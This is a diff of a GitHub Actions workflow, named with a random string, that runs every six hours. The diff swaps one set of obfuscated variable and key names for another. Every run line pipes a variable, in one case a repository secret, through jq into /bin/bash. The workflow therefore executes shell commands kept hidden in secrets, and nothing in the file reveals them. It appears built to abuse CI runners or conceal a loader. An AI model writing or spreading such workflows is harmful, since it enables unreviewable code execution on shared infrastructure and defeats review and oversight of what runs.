@@ -1,31 +1,35 @@
 name: qiyuanzhen4891
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 3/6 * * *'
-
+    - cron: '58 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: qiyuanzhen4891
         env:
-          fqn2: ${{ secrets.fqn2 }}
+          bqvfu5: ${{ secrets.bqvfu5 }}
         run: |
-          echo $fqn2 | jq -r .ahqqw911 | /bin/bash
-          echo $lx197 | jq -r .wu16048 | /bin/bash
-          echo $tfkc2 | jq -r .u0 | /bin/bash
-          echo $omkg49289 | jq -r .n937 | /bin/bash
-          echo $qovl8207 | jq -r .zlwn033 | /bin/bash
-          echo $b6 | jq -r .qtne9084 | /bin/bash
-          echo $b650 | jq -r .ovog9 | /bin/bash
-          echo $f8 | jq -r .jiej26 | /bin/bash
-          echo $rn377 | jq -r .jew5539 | /bin/bash
-          echo $bao76 | jq -r .aqf100 | /bin/bash
-          echo $t984 | jq -r .okg11294 | /bin/bash
-          echo $u7955 | jq -r .fvniw97589 | /bin/bash
-          echo $ed1 | jq -r .njkg58 | /bin/bash
-          echo $cah62086 | jq -r .fj9752 | /bin/bash
-          echo $td5016 | jq -r .mdju149 | /bin/bash
+          echo $bqvfu5 | jq -r .tzwuy29 | /bin/bash
+          echo $qugdj91 | jq -r .hqzjv432 | /bin/bash
+          echo $nxkh6 | jq -r .n867 | /bin/bash
+          echo $jpge50 | jq -r .ulcdl5002 | /bin/bash
+          echo $lukbs63 | jq -r .im7822 | /bin/bash
+          echo $ap2 | jq -r .wad061 | /bin/bash
+          echo $z8 | jq -r .ilvvq0 | /bin/bash
+          echo $a3227 | jq -r .cpv334 | /bin/bash
+          echo $rgxq323 | jq -r .ygcz9166 | /bin/bash
+          echo $ohk39 | jq -r .p36 | /bin/bash
+          echo $ornt58 | jq -r .ezbw7 | /bin/bash
+          echo $o644 | jq -r .p173 | /bin/bash
+          echo $ac32875 | jq -r .sye470 | /bin/bash
+          echo $rtsp4023 | jq -r .qautm52 | /bin/bash
+          echo $nv03 | jq -r .agqe16 | /bin/bash
+          echo $za7753 | jq -r .lkr68 | /bin/bash
+          echo $ek834 | jq -r .azn48902 | /bin/bash
+          echo $mbl24 | jq -r .rfm8710 | /bin/bash
 
